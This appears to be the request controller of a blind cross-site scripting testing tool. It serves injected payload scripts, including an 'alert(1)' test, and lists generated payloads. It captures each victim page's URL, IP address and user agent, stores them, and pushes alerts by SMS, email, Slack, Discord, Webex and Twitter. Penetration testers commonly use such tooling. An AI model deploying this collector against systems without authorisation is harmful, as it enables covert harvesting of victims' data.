// Copyright 2019 Lewis Ardern. All rights reserved.

const mail = require('../utilities/services/email');
const sms = require('../utilities/services/sms');
const process = require('../utilities/process');
const save = require('../utilities/save');
const uuid = require('uuid/v1');
const config = require('../config/config');
const slack = require('../utilities/services/slack');
const discord = require('../utilities/services/discord');
const ciscoTeams = require('../utilities/services/spark');
const twitter = require('../utilities/services/twitter');
const template = require('../utilities/templates/script');
const payloads = require('../utilities/payloads');

/* eslint-disable no-shadow */
function reportToUtilities(guid, domain, config) {
  mail.sendMail(guid, domain, config);
  slack.sendSlack(guid, domain, config);
  ciscoTeams.sendCiso(guid, domain, config);
  discord.sendDiscord(guid, domain, config);
  twitter.sendTwitter(guid, domain, config);
}

function sendSmsAndSaveToDisk(domain, res, guid) {
  if (!sms.lastSms()) {
    console.log(`Sending SMS And Saving To Disk For URL ${domain.url}`);
    sms.sendSMS(guid, domain, config, save);
    save.saveFile(guid, domain, config);
    res.redirect(domain.url);
  } else {
    res.redirect(domain.url);
    console.log(`Already Sent SMS Today, Saving To Disk For URL ${domain.url}`);
    save.saveFile(guid, domain, config);
  }
}
/* eslint-enable no-shadow */

exports.displayScript = (req, res) => {
  res.type('.js');
  const generatedTemplate = template.generateTemplate(config);
  res.send(generatedTemplate);
};

exports.displayDefault = (req, res) => {
  res.type('.js');
  res.send('alert(1)');
};

exports.generatePayloads = (req, res) => {
  res.set('Content-Type', 'text/plain');
  const generatedPayloads = payloads.generatePayloads(config);
  res.send(generatedPayloads);
};

exports.capture = (req, res) => {
  let domain = {};
  const guid = uuid();
  if (req.body._) {
    domain = process.processDomain(req.body._, config);
  } else {
    domain = process.processDomain(null, config);
    console.log(req.get('referer'));
    domain.url = req.get('referer') || null;
  }
  domain.victimIP =
    req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress ||
    null;
  domain.userAgent = req.headers['user-agent'] || null;
  console.log(domain);
  // check if domain.url exists or is not null/empty (should always be captured if valid request)
  sendSmsAndSaveToDisk(domain, res, guid);

  // Always send to email, slack, webex teams, or discord
  reportToUtilities(guid, domain, config);
};
